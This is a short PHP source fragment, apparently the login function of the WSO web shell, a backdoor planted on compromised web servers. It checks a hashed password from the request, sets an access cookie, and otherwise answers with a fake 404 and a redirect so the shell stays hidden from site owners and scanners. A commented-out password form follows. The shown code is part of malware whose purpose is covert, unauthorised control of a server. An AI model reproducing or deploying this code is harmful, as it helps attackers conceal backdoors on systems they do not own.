<?php
function wsoLogin() {
    global $auth_pass;
    if (!empty($auth_pass)) {
        if (isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) == $auth_pass)) {
            WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
        }
    
        if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass)) {
            header('HTTP/1.0 404 Not Found');
            header('Location: '. $_SERVER['HTTP_HOST']);
            die;
        }
    }
	//die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}
